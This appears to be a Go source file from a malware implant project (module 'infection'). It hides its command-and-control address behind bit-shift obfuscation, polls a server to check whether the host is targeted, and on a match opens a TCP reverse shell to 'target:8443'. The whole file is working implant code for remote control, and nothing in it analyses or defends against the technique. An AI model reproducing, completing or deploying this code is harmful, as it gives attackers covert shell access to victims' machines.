package tunnel

import (
	"encoding/json"
	"github.com/parnurzeal/gorequest"
	"infection/machineinfo"
	"infection/tunnel/reverse"
	//"time"
	//"strings"
	"unsafe"
	//"fmt"
)

const (
	EAX = uint8(unsafe.Sizeof(true))
	ONE = "EAX"
)

func GetServerAddr() string {
	var str []byte
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX<<EAX)
	str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX | EAX))
	str = append(str, (EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	return string(str)
}

type Check struct {
	Hostid string `json:"hostid"`
}

func Tunnel(addr string) {
	var check Check
	var versionDetail = machineinfo.GetSystemVersion()
	resp, body, _ := gorequest.New().
		Get(addr).
		End()
	if resp.StatusCode == 200 && body != "" {
		if err := json.Unmarshal([]byte(body), &check); err == nil {
			// if not need  dont open the tunnel to revert shell
			if check.Hostid == versionDetail.Hostid {
				go reverse.CreateRevShell("tcp", "target:8443")
			} else {
				return
			}
		}
	}
	//ReverseShell.CreateRevShell("tcp", GetServerAddr())
	//ReverseShell.CreateRevShell("tcp", "127.0.0.1:8443")
	//reverse.CreateRevShell("tcp", "target:8443")
	//time.Sleep(10 * time.Second)
	//ReverseShell.DestroyShell()
}
